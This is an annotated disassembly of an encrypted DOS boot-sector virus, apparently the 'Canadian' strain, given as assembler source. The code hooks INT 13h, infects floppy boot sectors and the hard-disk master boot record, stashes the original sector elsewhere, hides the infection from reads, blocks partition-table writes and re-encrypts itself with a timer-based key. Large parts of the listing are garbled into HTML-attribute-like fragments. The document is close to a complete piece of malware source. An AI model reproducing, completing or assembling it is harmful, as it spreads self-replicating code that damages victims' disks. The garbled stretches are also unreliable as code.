

S0000	SEGMENT
	ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
	ORG	$+7C00H

	JMP	FAR PTR	L07C0:L019F	;=7D9F		;7C00 EA 9F 01 C0 07

;================================================
;	Coded part of virus
;------------------------------------------------
L7C05	db	0		;0 = FDD, 2 = HDD	;7C05 00

L7C06	dw	0A189h		;oryginal int 13h - off	;7C06 89 A1
L7C08	dw			;		  - seg	;7C08 00 F0

				;<- entry="" point="" into="" copied="" virus="" code="" l7c0a="" dw="" 00fah="" ;="offset" l7cfa="" ;7c0a="" fa="" 00="" l7c0c="" dw="" 9fc0h="" ;virus="" segment="" in="" memory;7c0c="" c0="" 9f="" l7c0e="" dw="" 7c00h,0000h="" ;boot="" sector="" entry="" point;7c0e="" 00="" 7c="" 00="" 00="" ;="===============================================" ;="" virus="" int="" 13h="" service="" ;------------------------------------------------="" l7c12:="" pushf="" ;7c12="" 9c="" push="" ds="" ;7c13="" 1e="" push="" dx="" ;7c14="" 52="" push="" si="" ;7c15="" 56="" push="" di="" ;7c16="" 57="" push="" ax="" ;7c17="" 50="" push="" bx="" ;7c18="" 53="" push="" cx="" ;7c19="" 51="" push="" es="" ;7c1a="" 06="" cmp="" dl,80h="" ;hdd="" ;7c1b="" 80="" fa="" 80="" jnb="" l7c5f="" ;-=""> yes			;7C1E 73 3F
	CMP	AH,2		;read ?			;7C20 80 FC 02
	JNZ	L7C5F		;-> no			;7C23 75 3A
	XOR	AX,AX					;7C25 31 C0
	MOV	DS,AX					;7C27 8E D8
	CMP	BYTE PTR DS:[46Ch],16h	;timer counter	;7C29 80 3E 6C 04 16
	JNB	L7C5F					;7C2E 73 2F
	PUSH	CS					;7C30 0E
	POP	ES					;7C31 07
	MOV	AX,201H		;read 1 sector		;7C32 B8 01 02
	MOV	BX,200H		;buffer			;7C35 BB 00 02
	MOV	CX,1		;track=0, sector=1	;7C38 B9 01 00
	XOR	DH,DH		;head=0			;7C3B 30 F6
	CALL	L7CA4		;EXEC oryginal int 13h	;7C3D E8 64 00
	JB	L7C5F		;-> error		;7C40 72 1D
	CALL	L7CAB		;sector infected ?	;7C42 E8 66 00
	JZ	L7C5F		;-> yes			;7C45 74 18
	MOV	AX,301H		;write 1 sector		;7C47 B8 01 03
	MOV	CL,2		;track=0, sector=2	;7C4A B1 02
	MOV	DH,1		;head=1			;7C4C B6 01
	CALL	L7CA4		;EXEC oryginal int 13h	;7C4E E8 53 00
	JB	L7C5F		;-> error		;7C51 72 0C
	CALL	L7D70		;Make coded virus copy	;7C53 E8 1A 01
	MOV	AX,301H		;write 1 sector		;7C56 B8 01 03
	DEC	CX		;track=0, sector=1	;7C59 49
	XOR	DH,DH		;head=0			;7C5A 30 F6
	CALL	L7CA4		;EXEC oryginal int 13h	;7C5C E8 45 00

			;<- exit="" l7c5f:="" pop="" es="" ;7c5f="" 07="" pop="" cx="" ;7c60="" 59="" pop="" bx="" ;7c61="" 5b="" pop="" ax="" ;7c62="" 58="" pop="" di="" ;7c63="" 5f="" pop="" si="" ;7c64="" 5e="" pop="" dx="" ;7c65="" 5a="" pop="" ds="" ;7c66="" 1f="" popf="" ;7c67="" 9d="" push="" cx="" ;7c68="" 51="" push="" dx="" ;7c69="" 52="" pushf="" ;7c6a="" 9c="" cmp="" cx,1="" ;track="0," sector="1" ;7c6b="" 83="" f9="" 01="" jnz="" l7c9c="" ;-=""> no, exit		;7C6E 75 2C
	CMP	DX,80H		;HDD ?			;7C70 81 FA 80 00
	JNZ	L7C9C		;-> no, exit		;7C74 75 26
	CMP	AH,2		;read ?			;7C76 80 FC 02
	JZ	L7C86		;-> yes			;7C79 74 0B
	CMP	AH,3		;write ?		;7C7B 80 FC 03
	JNZ	L7C9C		;-> no, exit		;7C7E 75 1C

	;<----- write="" partition="" table="" xor="" ah,ah="" ;error="" code="0" ;7c80="" 30="" e4="" popf="" ;7c82="" 9d="" clc="" ;no="" error="" ptr="" ;7c83="" f8="" jmp="" short="" l7c8d="" ;-=""> exit, no action	;7C84 EB 07

	;<----- read="" partition="" table="" l7c86:="" mov="" cx,7="" ;track="0," sector="7" ;7c86="" b9="" 07="" 00="" popf="" ;7c89="" 9d="" call="" l7ca4="" ;exec="" oryginal="" int="" 13h="" ;7c8a="" e8="" 17="" 00="" l7c8d:="" pop="" dx="" ;7c8d="" 5a="" pop="" cx="" ;7c8e="" 59="" retf="" 2="" ;7c8f="" ca="" 02="" 00="" db="" 039h,05ch,07ah,087h,07ah="" ;7c92="" 39="" 5c="" 7a="" 87="" 7a="" db="" 07dh,082h,07ah,087h,039h="" ;7c97="" 7d="" 82="" 7a="" 87="" 39="" ;db="" '="" canadian="" '="" incremented="" by="" 19h=""></-----><- exit="" l7c9c:="" popf="" ;7c9c="" 9d="" pop="" dx="" ;7c9d="" 5a="" pop="" cx="" ;7c9e="" 59="" jmp="" dword="" ptr="" cs:[6]="" ;oryginal="" int="" 13h="" ;7c9f="" 2e="" ff="" 2e="" 06="" 00="" ;="===============================================" ;="" execute="" oryginal="" int="" 13h="" ;------------------------------------------------="" l7ca4:="" pushf="" ;7ca4="" 9c="" call="" dword="" ptr="" cs:6="" ;7ca5="" 2e="" ff="" 1e="" 06="" 00="" retn="" ;7caa="" c3="" ;="===============================================" ;="" check="" if="" sector="" allready="" infected="" ;------------------------------------------------="" l7cab:="" push="" cs="" ;7cab="" 0e="" pop="" ds="" ;7cac="" 1f="" xor="" si,si="" ;7cad="" 31="" f6="" mov="" di,200h="" ;7caf="" bf="" 00="" 02="" mov="" cx,2="" ;7cb2="" b9="" 02="" 00="" cld="" ;7cb5="" fc="" repz="" cmpsw="" ;7cb6="" f3="" a7="" retn="" ;7cb8="" c3="" ;="===============================================" ;="" coded="" part="" entry="" point="" ;------------------------------------------------="" l7cb9:="" xor="" ax,ax="" ;7cb9="" 33="" c0="" mov="" ds,ax="" ;7cbb="" 8e="" d8="" cli="" ;establish="" stack="" ;7cbd="" fa="" mov="" ss,ax="" ;7cbe="" 8e="" d0="" mov="" sp,7c00h="" ;7cc0="" bc="" 00="" 7c="" sti="" ;7cc3="" fb=""></-><- get="" int="" 13h="" vector="" mov="" ax,ds:[4ch]="" ;int="" 13h="" offset="" ;7cc4="" a1="" 4c="" 00="" mov="" [l7c06],ax="" ;7cc7="" a3="" 06="" 7c="" mov="" ax,ds:[4eh]="" ;int="" 13h="" segment="" ;7cca="" a1="" 4e="" 00="" mov="" [l7c08],ax="" ;7ccd="" a3="" 08="" 7c="" mov="" ax,ds:[413h]="" ;bios="" memory="" size="" ;7cd0="" a1="" 13="" 04="" dec="" ax="" ;="" -="" 1="" kb="" ;7cd3="" 48="" mov="" ds:[413h],ax="" ;7cd4="" a3="" 13="" 04="" mov="" cl,6="" ;7cd7="" b1="" 06="" shl="" ax,cl="" ;kb="" -=""> paragraph	;7CD9 D3 E0
	MOV	ES,AX					;7CDB 8E C0
	MOV	[L7C0C],AX				;7CDD A3 0C 7C
	MOV	DS:[4Eh],AX	;int 13h segment	;7CE0 A3 4E 00
	MOV	AX,12H		;= L7C12		;7CE3 B8 12 00
	MOV	DS:[4Ch],AX	;int 13h offset		;7CE6 A3 4C 00
	MOV	CX,100h		;virus length (words)	;7CE9 B9 00 01
	PUSH	CS					;7CEC 0E
	POP	DS					;7CED 1F
	XOR	SI,SI					;7CEE 33 F6
	XOR	DI,DI					;7CF0 31 FF
	CLD						;7CF2 FC
	REPZ	MOVSW		;virus code copy	;7CF3 F3 A5
	JMP	DWORD PTR CS:[0Ah]	;=L7C0A		;7CF5 2E FF 2E 0A 00

L7CFA:	XOR	AX,AX		;reset disk system	;7CFA 31 C0
	CALL	L7CA4		;EXEC oryginal int 13h	;7CFC E8 A5 FF
	XOR	AX,AX					;7CFF 33 C0
	MOV	ES,AX					;7D01 8E C0
	MOV	AX,201h		;read 1 sector		;7D03 B8 01 02
	MOV	BX,7C00h	;boot sector buffer	;7D06 BB 00 7C
	CMP	BYTE PTR CS:[5],0			;7D09 2E 80 3E 05 00 00
	JZ	L7D1C					;7D0F 74 0B

				;<- hdd="" mov="" cx,7="" ;track="0," sector="7" ;7d11="" b9="" 07="" 00="" mov="" dx,80h="" ;head="0," drive="C:" ;7d14="" ba="" 80="" 00="" call="" l7ca4="" ;exec="" oryginal="" int="" 13h="" ;7d17="" e8="" 8a="" ff="" jmp="" short="" l7d65="" ;7d1a="" eb="" 49=""></-><- fdd="" l7d1c:="" mov="" cx,2="" ;track="0," sector="2" ;7d1c="" b9="" 02="" 00="" mov="" dx,100h="" ;head="1," drive="A:" ;7d1f="" ba="" 00="" 01="" call="" l7ca4="" ;exec="" oryginal="" int="" 13h="" ;7d22="" e8="" 7f="" ff="" jb="" l7d65="" ;-=""> error		;7D25 72 3E
	PUSH	CS					;7D27 0E
	POP	ES					;7D28 07
	MOV	AX,201H		;read 1 sector		;7D29 B8 01 02
	MOV	BX,200H		;buffer			;7D2C BB 00 02
	MOV	CL,1		;track=0, sector=1 (MBR);7D2F B1 01
	MOV	DX,80H		;head=0,drive=C:	;7D31 BA 80 00
	CALL	L7CA4		;EXEC oryginal int 13h	;7D34 E8 6D FF
	JB	L7D65		;-> error		;7D37 72 2C
	CALL	L7CAB		;sector infected ?	;7D39 E8 6F FF
	JZ	L7D65		;-> yes			;7D3C 74 27
	MOV	BYTE PTR CS:[5],2	;HDD ptr	;7D3E 2E C6 06 05 00 02
	MOV	AX,301H		;write 1 sector		;7D44 B8 01 03
	MOV	CX,7		;track=0, sector=7	;7D47 B9 07 00
	CALL	L7CA4		;EXEC oryginal int 13h	;7D4A E8 57 FF
	JB	L7D65		;-> error		;7D4D 72 16
	MOV	SI,3BEH		;partition table	;7D4F BE BE 03
	MOV	DI,1BEH					;7D52 BF BE 01
	MOV	CX,20H		;table length		;7D55 B9 20 00
	CLD						;7D58 FC
	REPZ	MOVSW		;move partition table	;7D59 F3 A5
	CALL	L7D70		;Make coded virus copy	;7D5B E8 12 00
	MOV	AX,301H		;write 1 sector		;7D5E B8 01 03
	INC	CX		;track=0, sector=1	;7D61 41
	CALL	L7CA4		;EXEC oryginal int 13h	;7D62 E8 3F FF

L7D65:	MOV	BYTE PTR CS:[5],0			;7D65 2E C6 06 05 00 00
	JMP	DWORD PTR CS:[0Eh]	;=7C0E=run boot	;7D6B 2E FF 2E 0E 00

;================================================
;	Make coded copy of virus
;------------------------------------------------
L7D70:	PUSH	CX					;7D70 51
	PUSH	DX					;7D71 52
	MOV	AH,0		;read system-timer time	;7D72 B4 00
	INT	1AH					;7D74 CD 1A
	CMP	DL,0		;lowest order part	;7D76 80 FA 00
	JNZ	L7D7C					;7D79 75 01
	INC	DX					;7D7B 42
L7D7C:	MOV	DS:[1AFh],DL	;encription key		;7D7C 88 16 AF 01
	XOR	SI,SI					;7D80 31 F6
	MOV	DI,200H					;7D82 BF 00 02
	MOV	CX,100H					;7D85 B9 00 01
	CLD						;7D88 FC
	REPZ	MOVSW		;virus code copy	;7D89 F3 A5
	MOV	DI,205H		;coded area begin	;7D8B BF 05 02
	MOV	CX,19AH		;coded area length	;7D8E B9 9A 01
	MOV	AH,DS:[1AFh]	;encryption key		;7D91 8A 26 AF 01
L7D95:	MOV	AL,[DI]					;7D95 8A 05
	SUB	AL,AH					;7D97 28 E0
	STOSB						;7D99 AA
	LOOP	L7D95					;7D9A E2 F9
	POP	DX					;7D9C 5A
	POP	CX					;7D9D 59
	RETN						;7D9E C3
;------------------------------------------------
;	End of coded part of virus
;================================================



;================================================
;	Encoder routine
;------------------------------------------------
L7D9F:	mov	ax,cs					;7D9F 8C C8
	MOV	DS,AX					;7DA1 8E D8
	MOV	ES,AX					;7DA3 8E C0
	MOV	DI,5					;7DA5 BF 05 00
	MOV	CX,19AH					;7DA8 B9 9A 01
	CLD						;7DAB FC
L7DAC:	MOV	AL,[DI]					;7DAC 8A 05
	ADD	AL,7					;7DAE 04 07
L7DAF	equ	$-1		;code value
	STOSB						;7DB0 AA
	LOOP	L7DAC					;7DB1 E2 F9
	JMP	L7CB9					;7DB3 E9 03 FF

	db	'PCAT',0		;7DB6 03 50 43 03 41 54 03 00

;===============================================
;	Partition table
;-----------------------------------------------
	db	080h,001h,001h,000h,004h,009h,051h,069h	;7DBE 80 01 01 00 04 09 51 69
	db	011h,000h,000h,000h,053h,0F0h,000h,000h	;7DC6 11 00 00 00 53 F0 00 00

	db	000h,000h,041h,06Ah,005h,009h,0D1h,0FBh	;7DCE 00 00 41 6A 05 09 D1 FB
	db	064h,0F0h,000h,000h,0F4h,0B4h,001h,000h	;7DD6 64 F0 00 00 F4 B4 01 00

	db	0,0,0,0,0,0,0,0				;7DDE 00 00 00 00 00 00 00 00
	db	0,0,0,0,0,0,0,0				;7DE6 00 00 00 00 00 00 00 00

	db	0,0,0,0,0,0,0,0				;7DEE 00 00 00 00 00 00 00 00
	db	0,0,0,0,0,0,0,0				;7DF6 00 00 00 00 00 00 00 00

	db	055h,0AAh	;boot sector mark	;7DFE 55 AA

S0000	ENDS

	END	


</-></-></-----></-></->